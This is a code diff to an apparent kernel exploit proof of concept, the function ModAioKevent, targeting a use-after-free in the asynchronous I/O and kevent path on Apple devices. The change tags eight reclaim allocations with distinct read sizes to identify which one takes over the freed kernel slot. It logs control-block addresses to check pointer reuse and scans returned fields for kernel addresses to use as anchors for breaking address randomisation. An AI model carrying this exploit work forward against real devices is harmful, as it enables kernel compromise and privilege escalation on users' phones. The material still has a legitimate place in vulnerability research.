@@ -1516,9 +1516,12 @@ NSString *ModAioKevent(void) {
 
     const size_t FILE_SZ = 0x10000;
     const ssize_t VICTIM_NB = FILE_SZ;
+    // Per-index distinct reclaim sizes.  ext[1] is the reclaimed entry's
+    // returnval, so a distinct nbytes per index turns ext[1] into a tag that
+    // names WHICH reclaim allocation won the freed slot: 0x200, 0x240, ...
     const ssize_t RECL_NB = 0x0200;
+    const ssize_t RECL_STEP = 0x040;
     const int NRECLAIM = 8;
-    const uint64_t RECL_MARKER = 0x4141;
 
     NSString *dir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                          NSUserDomainMask, YES) firstObject];
@@ -1533,6 +1536,14 @@ NSString *ModAioKevent(void) {
 
     int kq = kqueue();
     if (kq < 0) { close(fd); return @"kqueue failed"; }
+    // kevent.ident is entryp->uaiocbp captured at registration time
+    // (aio_register_kevent, kern_aio.c:1523), so printing the aiocb
+    // addresses tells us whether the knote still names the VICTIM's aiocb
+    // or a reclaim one - i.e. whether the entry pointer itself was reused.
+    AveLog(S(@"[aio20637b12] victim_aiocb=%p reclaim_aiocb0=%p kq=%d",
+             (void *)&rs_aio_cb, (void *)&rs_aio_rcb[0], kq));
+    rs_aio_dlog(S(@"victim_aiocb=%p reclaim_aiocb0=%p",
+                  (void *)&rs_aio_cb, (void *)&rs_aio_rcb[0]));
 
     static char vbuf[0x10000];
 
@@ -1573,7 +1584,8 @@ NSString *ModAioKevent(void) {
                             rs_aio_rcb[i].aio_fildes = fd;
                             rs_aio_rcb[i].aio_offset = 0;
                             rs_aio_rcb[i].aio_buf = rs_aio_rbuf[i];
-                            rs_aio_rcb[i].aio_nbytes = RECL_NB;
+                            rs_aio_rcb[i].aio_nbytes =
+                                RECL_NB + (ssize_t)i * RECL_STEP;
                             rs_aio_rcb[i].aio_lio_opcode = LIO_READ;
                             rs_aio_rcb[i].aio_sigevent.sigev_notify = SIGEV_NONE;
                             errno = 0;
@@ -1634,9 +1646,13 @@ NSString *ModAioKevent(void) {
                 uint64_t ud = (uint64_t)kev[i].udata;
                 AveLog(S(@"[aio20637b12] round=%d ev=%d ext0=%#llx ext1=%#llx ident=%#llx udata=%#llx",
                          round, i, e0, e1, id, ud));
-                if (e1 == RECL_MARKER || e1 == RECL_NB) {
+                if (e1 >= RECL_NB &&
+                    e1 <= RECL_NB + (NRECLAIM - 1) * RECL_STEP) {
                     hits++;
-                    AveLog(S(@"[aio20637b12] *** HIT: kevent delivered on the RECLAIMED entry (ext1=%#llx) ***", e1));
+                    int widx = (int)((e1 - (uint64_t)RECL_NB) / (uint64_t)RECL_STEP);
+                    AveLog(S(@"[aio20637b12] *** HIT: kevent read the FREED slot: returnval=%#llx -> reclaim[%d] owns it ***", e1, widx));
+                    rs_aio_dlog(S(@"HIT round=%d returnval=%#llx winner=reclaim[%d] ext0=%#llx ident=%#llx",
+                                  round, e1, widx, e0, id));
                 }
                 // a kernel-looking value in any field is a KASLR anchor
                 struct { const char *n; uint64_t v; } flds[] = {
